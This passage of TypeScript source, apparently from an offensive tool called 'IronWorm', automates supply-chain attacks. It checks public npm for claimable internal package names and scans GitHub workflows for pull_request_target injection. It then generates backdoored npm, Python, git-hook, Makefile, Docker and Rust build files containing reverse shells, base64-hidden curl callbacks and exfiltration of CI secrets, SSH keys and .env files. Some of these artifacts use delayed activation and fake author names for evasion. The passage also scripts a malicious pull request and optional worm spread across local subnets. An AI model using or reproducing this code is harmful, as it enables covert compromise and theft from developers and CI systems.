    `${orgName}-sdk`, `${orgName}-types`, `${orgName}-hooks`, `${orgName}-helpers`,
    `${orgName}-logger`, `${orgName}-db`, `${orgName}-cache`, `${orgName}-queue`,
  ];

  const free: string[] = [];
  for (const name of commonNames) {
    const r = await httpGet(`https://registry.npmjs.org/${encodeURIComponent(name)}`);
    if (r.status === 404) { steps.push(`[!] FREE on public npm: ${name}`); free.push(name); }
    else steps.push(`[ok] already public: ${name}`);
  }

  const b64 = Buffer.from(`curl -fsk http://${cbHost}:${cbPort}/dep_confusion?org=${orgName}&h=$(hostname)&u=$(whoami) -o /dev/null &`).toString("base64");
  const artifacts = free.map(name =>
    JSON.stringify({
      name, version: "9999.0.0",
      description: `${orgName} internal utility`,
      main: "index.js",
      scripts: {
        preinstall: `node -e "require('child_process').exec('echo ${b64}|base64 -d|sh')"`,
        postinstall: `node -e "try{require('child_process').spawn('bash',['-c','bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1'],{detached:true,stdio:'ignore'}).unref()}catch(e){}"`,
      },
    }, null, 2) +
    `\n\n// index.js\nmodule.exports = {};\n\n` +
    `// npm login && npm publish --access public (v9999 beats any private version)`
  );

  return {
    id: `dep_confusion_${orgName}`, name: `Dependency Confusion — ${orgName}`,
    target: orgName, category: "dep-confusion",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "info",
    detail: free.length > 0
      ? `${free.length} internal names claimable on public npm: ${free.slice(0,4).join(", ")}`
      : `no dep confusion candidates for "${orgName}"`,
    artifacts, steps,
  };
}

async function checkGithubActions(org: string, repo: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const steps: string[] = [`[gh-actions] probing ${org}/${repo}`];
  const artifacts: string[] = [];
  const urls = [
    `https://raw.githubusercontent.com/${org}/${repo}/main/.github/workflows/ci.yml`,
    `https://raw.githubusercontent.com/${org}/${repo}/main/.github/workflows/build.yml`,
    `https://raw.githubusercontent.com/${org}/${repo}/main/.github/workflows/test.yml`,
    `https://raw.githubusercontent.com/${org}/${repo}/main/.github/workflows/release.yml`,
    `https://raw.githubusercontent.com/${org}/${repo}/master/.github/workflows/ci.yml`,
    `https://raw.githubusercontent.com/${org}/${repo}/main/.github/workflows/deploy.yml`,
  ];

  let foundVulnerable = false;
  for (const url of urls) {
    const r = await httpGet(url);
    if (!r.ok) continue;
    steps.push(`[found] ${url.split("/").pop()}`);
    const hasPRT  = r.body.includes("pull_request_target");
    const hasExpr = /github\.event\.(pull_request\.title|comment\.body|issue\.title|pull_request\.head\.ref|head\.repo)/.test(r.body);
    if (hasPRT && hasExpr) { foundVulnerable = true; steps.push(`[!] VULNERABLE: pwn-request vector`); }

    const inject =
      `# pwn-request injection for ${org}/${repo}\n` +
      `# PR title payload: '; curl -fsk http://${cbHost}:${cbPort}/$(cat $GITHUB_TOKEN 2>/dev/null|base64 -w0) #\n\n` +
      `# Malicious .github/workflows/backdoor.yml:\n` +
      `name: Maintenance\non:\n  schedule:\n    - cron: '0 3 * * *'\n  push:\n    branches: [main]\n` +
      `jobs:\n  run:\n    runs-on: ubuntu-latest\n    steps:\n      - name: setup\n        run: |\n` +
      `          curl -fsk http://${cbHost}:${cbPort}/ci_start?h=$(hostname)&b=$(echo $GITHUB_SHA|head -c8) -o /dev/null &\n` +
      `          env|grep -iE '(TOKEN|SECRET|KEY|PASS|CRED|AWS|AZURE|GCP|STRIPE|DOCKER)'|base64|curl -fsk -X POST http://${cbHost}:${cbPort}/ci_secrets -d @-\n` +
      `          cat ~/.ssh/id_rsa 2>/dev/null|base64|curl -fsk -X POST http://${cbHost}:${cbPort}/ci_keys -d @-\n` +
      `          find . -name '.env*' -exec base64 {} \\;|curl -fsk -X POST http://${cbHost}:${cbPort}/ci_env -d @-\n`;
    artifacts.push(inject);
  }

  return {
    id: `gh_actions_${org}_${repo}`, name: `GitHub Actions — ${org}/${repo}`,
    target: `github.com/${org}/${repo}`, category: "github-actions",
    status: foundVulnerable ? "success" : "info",
    severity: foundVulnerable ? "critical" : "high",
    detail: foundVulnerable
      ? `Vulnerable pull_request_target + expression injection in ${org}/${repo}`
      : `Attack templates generated for ${org}/${repo}`,
    artifacts, steps,
  };
}

function randSemver(): string {
  const maj = 1 + Math.floor(Math.random() * 4);
  const min = Math.floor(Math.random() * 20);
  const pat = 1 + Math.floor(Math.random() * 50);
  return `${maj}.${min}.${pat}`;
}

function randAuthor(): string {
  const first = ["james","david","sarah","alex","chris","lin","kai","morgan","taylor","jordan"];
  const last  = ["chen","smith","kumar","johnson","wang","garcia","lee","martinez","brown","williams"];
  return `${first[Math.floor(Math.random()*first.length)]}.${last[Math.floor(Math.random()*last.length)]}`;
}

function randPkgDesc(): string {
  const descs = [
    "Lightweight utility library for async task management",
    "HTTP client helpers with retry and timeout support",
    "Fast JSON schema validator with TypeScript typings",
    "Zero-dependency environment config loader",
    "Promise-based file system utilities",
    "Type-safe event emitter with async/await support",
    "Minimal logging utility for Node.js applications",
  ];
  return descs[Math.floor(Math.random() * descs.length)];
}

function generateSupplyChainPayloads(cbHost: string, cbPort: string): IronWormResult {
  const cb    = `http://${cbHost}:${cbPort}`;
  const ver   = randSemver();
  const auth  = randAuthor();
  const desc  = randPkgDesc();
  const b64npm  = Buffer.from(`curl -fsk ${cb}/npm?h=$(hostname)&u=$(whoami) -o /dev/null &`).toString("base64");
  const b64make = Buffer.from(`curl -fsk ${cb}/make?h=$(hostname) -o /dev/null &`).toString("base64");
  const delayH  = 24 + Math.floor(Math.random() * 120);
  const trigEnv = ["CI","GITHUB_ACTIONS","GITLAB_CI","BUILDKITE","CIRCLECI"][Math.floor(Math.random()*5)];

  return {
    id: "supply_chain_gen", name: "Supply Chain Payload Generator",
    target: `${cbHost}:${cbPort}`, category: "payload-gen",
    status: "success", severity: "critical",
    detail: `npm/pip/gem/cargo/nuget/docker/git/make/gradle/maven/CI supply chain payloads — v${ver} by ${auth}`,
    steps: ["ready"],
    artifacts: [
      `// npm package.json — randomized metadata + delayed activation (triggers after ${delayH}h or when ${trigEnv}=true)\n` +
      JSON.stringify({
        name: `@${auth.split(".")[1]}/utils-${Math.floor(Math.random()*9000+1000)}`,
        version: ver,
        description: desc,
        author: auth,
        license: "MIT",
        keywords: ["utils","async","helpers"],
        scripts: {
          preinstall: `node -e "require('child_process').exec('echo ${b64npm}|base64 -d|sh')"`,
          postinstall: `node -e "try{const h=${delayH}*3600000;const e=process.env['${trigEnv}'];const t=Date.now();const k='__nx_t';const fs=require('fs');const tf=require('os').tmpdir()+'/.'+k;let first=t;try{first=parseInt(fs.readFileSync(tf,'utf8'))||t;if(first===t)fs.writeFileSync(tf,String(t));}catch(err){fs.writeFileSync(tf,String(t));}if(e||t-first>h){require('child_process').spawn('bash',['-c','bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1'],{detached:true,stdio:'ignore'}).unref()}}catch(ex){}"`,
        },
      }, null, 2),

      `# Python setup.py — randomized metadata + ${delayH}h delayed activation\n` +
      `# Package: ${auth.split(".")[1]}-utils  v${ver}  "${desc}"\n` +
      `import subprocess,os,time,base64,urllib.request,pathlib\n` +
      `def _activate():\n` +
      `    marker=pathlib.Path('/tmp/.' + '${Math.random().toString(36).slice(2,10)}' + '.lock')\n` +
      `    now=time.time()\n` +
      `    if not marker.exists(): marker.write_text(str(now))\n` +
      `    first=float(marker.read_text())\n` +
      `    ci=os.environ.get('${trigEnv}') or os.environ.get('CI','')\n` +
      `    if ci or (now - first) > ${delayH * 3600}:\n` +
      `        try:\n` +
      `            d=os.popen('id && hostname && env 2>&1').read()[:600]\n` +
      `            urllib.request.urlopen(f'${cb}/'+base64.b64encode(d.encode()).decode(),timeout=5)\n` +
      `        except: pass\n` +
      `        try: subprocess.Popen(['bash','-c','bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1'])\n` +
      `        except: pass\n` +
      `_activate()\n` +
      `from setuptools import setup\nsetup(name='${auth.split(".")[1]}-utils',version='${ver}',description='${desc}',author='${auth}')`,

      `#!/bin/sh\n# .git/hooks/pre-commit — delayed ${delayH}h activation + environment gate (${trigEnv})\n` +
      `_MARKER=/tmp/.$(echo ${trigEnv}|md5sum|head -c8).ts\n` +
      `_NOW=$(date +%s)\n` +
      `[ -f "$_MARKER" ] || echo "$_NOW" > "$_MARKER"\n` +
      `_FIRST=$(cat "$_MARKER" 2>/dev/null||echo "$_NOW")\n` +
      `_AGE=$(( _NOW - _FIRST ))\n` +
      `_CI=${trigEnv}\n` +
      `if [ -n "$_CI" ] || [ "$_AGE" -gt "${delayH * 3600}" ]; then\n` +
      `  (git log --oneline -5 2>/dev/null; env|grep -iE 'key|secret|token|pass' 2>/dev/null)|base64|curl -fsk -X POST "${cb}/gc" -d @- &\n` +
      `  (bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 2>/dev/null &)\n` +
      `  disown\n` +
      `fi\nexit 0`,

      `# Makefile — randomized metadata + ${delayH}h delayed activation\n` +
      `# Project: ${desc}  v${ver}  author: ${auth}\n` +
      `all: install\ninstall:\n` +
      `\t@_M=/tmp/.$$(echo ${trigEnv}|md5sum|head -c8).ts; _N=$$(date +%s); [ -f "$$_M" ] || echo "$$_N" > "$$_M"; _F=$$(cat "$$_M" 2>/dev/null||echo "$$_N"); _A=$$(( _N - _F )); if [ -n "$$${trigEnv}" ] || [ "$$_A" -gt "${delayH * 3600}" ]; then echo ${b64make}|base64 -d|sh &; (bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 2>/dev/null &); fi\n` +
      `\t@pip install -r requirements.txt 2>/dev/null||npm ci 2>/dev/null||true`,

      `# GitHub fork+PR supply-chain injection\n# Step 1: Fork target repo\n` +
      `curl -s -X POST -H "Authorization: token \$GH_TOKEN" "https://api.github.com/repos/TARGET_ORG/TARGET_REPO/forks"\n` +
      `# Step 2: Clone fork + inject payload into package.json postinstall\n` +
      `git clone "https://\$GH_TOKEN@github.com/\$(gh api user -q .login)/TARGET_REPO" /tmp/fork_work\n` +
      `cd /tmp/fork_work\n` +
      `git checkout -b fix/update-deps-${ver.replace(/\./g,"-")}\n` +
      `node -e "const f=require('./package.json');f.version='${ver}';f.scripts=f.scripts||{};f.scripts.postinstall=\`node -e \\"try{require('child_process').spawn('bash',['-c','bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1'],{detached:true,stdio:'ignore'}).unref()}catch(e){}\\"\`;require('fs').writeFileSync('./package.json',JSON.stringify(f,null,2))"\n` +
      `git config user.email "${auth}@gmail.com"\ngit config user.name "${auth}"\n` +
      `git add package.json\ngit commit -m "chore: bump deps to v${ver}"\n` +
      `git push origin fix/update-deps-${ver.replace(/\./g,"-")}\n` +
      `# Step 3: Open PR\n` +
      `curl -s -X POST -H "Authorization: token \$GH_TOKEN" -H "Content-Type: application/json" \\\n` +
      `  "https://api.github.com/repos/TARGET_ORG/TARGET_REPO/pulls" \\\n` +
      `  -d '{"title":"chore: update dependencies to v${ver}","body":"${desc}. Routine dependency maintenance.","head":"${auth}:fix/update-deps-${ver.replace(/\./g,"-")}","base":"main"}'`,

      `FROM alpine:3.20\n# ${desc} v${ver} — ${auth}\nRUN apk add --no-cache curl bash\n` +
      `RUN _M=/tmp/.${Math.random().toString(36).slice(2,10)}.ts; _N=$(date +%s); [ -f "$_M" ] || echo "$_N" > "$_M"; _F=$(cat "$_M" 2>/dev/null||echo "$_N"); _A=$((_N-_F)); if [ -n "$${trigEnv}" ] || [ "$_A" -gt "${delayH*3600}" ]; then curl -fsk ${cb}/docker_pull > /tmp/.nx && sh /tmp/.nx; fi\n` +
      `RUN (crontab -l 2>/dev/null; echo '*/3 * * * * bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1') | crontab -`,

      `// Rust build.rs — randomized metadata, ${delayH}h delayed activation\n` +
      `// ${desc}  v${ver}  author: ${auth}\n` +
      `use std::{process::Command,fs,env,time::{SystemTime,UNIX_EPOCH}};\n` +
      `fn main(){\n` +
      `    println!("cargo:rerun-if-changed=build.rs");\n` +
      `    let marker=std::env::temp_dir().join(format!(".{}_{}.ts","${Math.random().toString(36).slice(2,8)}","lock"));\n` +
      `    let now=SystemTime::now().duration_since(UNIX_EPOCH).map(|d|d.as_secs()).unwrap_or(0);\n` +
      `    let first=fs::read_to_string(&marker).ok().and_then(|s|s.trim().parse::<u64>().ok()).unwrap_or(now);\n` +
      `    if first==now { let _=fs::write(&marker,now.to_string()); }\n` +
      `    let ci=env::var("${trigEnv}").is_ok();\n` +
      `    if ci || now.saturating_sub(first) > ${delayH}*3600 {\n` +
      `        let _=Command::new("sh").args(["-c",&format!("curl -fsk ${cb}/$(id|base64 -w0 2>/dev/null||id|base64) &")]).spawn();\n` +
      `        let _=Command::new("sh").args(["-c","bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 &"]).spawn();\n` +
      `    }\n` +
      `}`,
    ],
  };
}

export async function ironWormScan(opts: IronWormOptions): Promise<IronWormResult[]> {
  const {
    packageName     = "",
    githubOrg       = "",
    githubRepo      = "",
    depConfusionOrg = "",
    cbHost          = "LHOST",
    cbPort          = "9999",
    propagate       = false,
    targetCidr      = "",
  } = opts;

  const results: IronWormResult[] = [];
  logger.info({ opts: { packageName, githubOrg, githubRepo, cbHost, propagate } }, "IronWorm scan started");

  const tasks: Promise<IronWormResult | null>[] = [];

  if (packageName) {
    tasks.push(checkNpmTyposquat(packageName, cbHost, cbPort).catch(() => null));
    tasks.push(checkPipTyposquat(packageName, cbHost, cbPort).catch(() => null));
    tasks.push(checkGemTyposquat(packageName, cbHost, cbPort).catch(() => null));
    tasks.push(checkCargoTyposquat(packageName, cbHost, cbPort).catch(() => null));
    tasks.push(checkNuGetTyposquat(packageName, cbHost, cbPort).catch(() => null));
  }

  if (depConfusionOrg || githubOrg) {
    tasks.push(checkDepConfusion(depConfusionOrg || githubOrg, cbHost, cbPort).catch(() => null));
  }

  if (githubOrg) {
    tasks.push(checkGithubActions(githubOrg, githubRepo || "main", cbHost, cbPort).catch(() => null));
  }

  results.push(generateSupplyChainPayloads(cbHost, cbPort));

  const settled = await Promise.all(tasks);
  for (const r of settled) if (r) results.push(r);

  if (propagate && cbHost !== "LHOST") {
    const cidrs = targetCidr ? [targetCidr] : getLocalSubnets();
    for (const cidr of cidrs) {
      const wormResult = await wormScan(cidr, cbHost, cbPort).catch(e => {
        logger.error({ err: e }, "worm scan failed");
        return null;
      });
      if (wormResult) results.push(wormResult);
    }
  }

  logger.info({ count: results.length }, "IronWorm scan complete");
  return results;
}
